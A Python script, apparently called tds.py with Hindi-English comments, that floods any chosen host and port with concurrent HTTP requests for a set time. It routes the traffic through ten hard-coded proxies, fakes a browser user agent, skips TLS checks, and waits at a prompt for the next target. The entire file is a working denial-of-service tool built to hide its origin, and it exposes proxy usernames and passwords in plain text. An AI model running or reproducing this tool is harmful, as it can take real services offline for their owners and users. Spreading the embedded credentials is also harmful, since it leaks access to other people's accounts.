import concurrent.futures
import sys
import time
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CONCURRENT_WORKERS = 10
DELAY_BETWEEN_REQS = 0.1
REQUEST_TIMEOUT = 10

# Behtar hai ki credentials ko environment variable se lein taaki GitHub par expose na hon
proxy_list = [
    "http://vkviimhc:lfkipgvb1r5s@31.59.20.176:6754",
    "http://vkviimhc:lfkjpgvb1r5s@31.56.127.193:7684",
    "http://vkviimhc:lfkjpgvb1r5s@45.38.107.97:6014",
    "http://vkviimhc:lfkjpgvb1r5s@198.105.121.200:6462",
    "http://vkviimhc:lfkjpgvb1r5s@64.137.96.74:6641",
    "http://vkviimhc:lfkjpgvb1r5s@198.23.243.226:6361",
    "http://vkviimhc:lfkjpgvb1r5s@38.154.185.97:6370",
    "http://vkviimhc:lfkjpgvb1r5s@84.247.60.125:6095",
    "http://vkviimhc:lfkjpgvb1r5s@142.111.67.146:5611",
    "http://vkviimhc:lfkjpgvb1r5s@191.96.254.138:6185",
]


def build_target_url(host: str, port: int) -> str:
    scheme = "https" if port == 443 else "http"
    return f"{scheme}://{host}:{port}"


def send_single_request(target_url: str, idx: int):
    proxy_url = proxy_list[idx % len(proxy_list)]
    proxies = {"http": proxy_url, "https": proxy_url}
    time.sleep(DELAY_BETWEEN_REQS)

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/116.0.0.0"
    }
    try:
        resp = requests.get(
            target_url,
            proxies=proxies,
            headers=headers,
            timeout=REQUEST_TIMEOUT,
            verify=False,
        )
        return resp.status_code
    except Exception:
        return "FAILED"


def run_for_duration(host: str, port: int, duration_sec: int):
    target_url = build_target_url(host, port)
    end_time = time.time() + duration_sec
    results = []
    req_counter = 0

    print(f"[RUNNING] Target: {target_url} | Duration: {duration_sec}s")

    with concurrent.futures.ThreadPoolExecutor(max_workers=CONCURRENT_WORKERS) as executor:
        while time.time() < end_time:
            batch_futures = []
            for _ in range(CONCURRENT_WORKERS):
                if time.time() >= end_time:
                    break
                batch_futures.append(executor.submit(send_single_request, target_url, req_counter))
                req_counter += 1

            for fut in concurrent.futures.as_completed(batch_futures):
                results.append(fut.result())

    summary = {status: results.count(status) for status in set(results)}
    print(f"[SUCCESS] Completed {len(results)} requests on {target_url}. Summary: {summary}")
    print("[READY] Waiting for next command: <ip_or_host> <port> <duration_seconds> (or 'exit')\n")


def interactive_loop():
    print("[READY] Enter command as: <ip_or_host> <port> <duration_seconds> (or 'exit')")
    while True:
        try:
            line = input("> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[EXIT] Stopping script.")
            break

        if not line:
            continue
        if line.lower() in {"exit", "quit"}:
            print("[EXIT] Stopping script.")
            break

        # Agar koi "./tds 4.4.4.4 44444 300" likhe toh './tds' prefix hata dega
        parts = line.split()
        if parts[0] in {"./tds", "tds"}:
            parts = parts[1:]

        if len(parts) != 3:
            print("[ERROR] Format: <ip_or_host> <port> <duration_seconds> (e.g. 4.4.4.4 44444 300)")
            continue

        host, port_str, dur_str = parts
        try:
            port = int(port_str)
            duration = int(dur_str)
            if not (1 <= port <= 65535) or duration <= 0:
                raise ValueError()
        except ValueError:
            print("[ERROR] Port (1-65535) aur duration (>0 seconds) valid numbers hone chahiye.")
            continue

        run_for_duration(host, port, duration)


if __name__ == "__main__":
    # Agar start karte waqt hi arguments diye gaye hon: python tds.py 4.4.4.4 44444 300
    args = sys.argv[1:]
    if len(args) == 3:
        try:
            run_for_duration(args[0], int(args[1]), int(args[2]))
        except ValueError:
            print("[ERROR] Invalid CLI arguments.")
    interactive_loop()
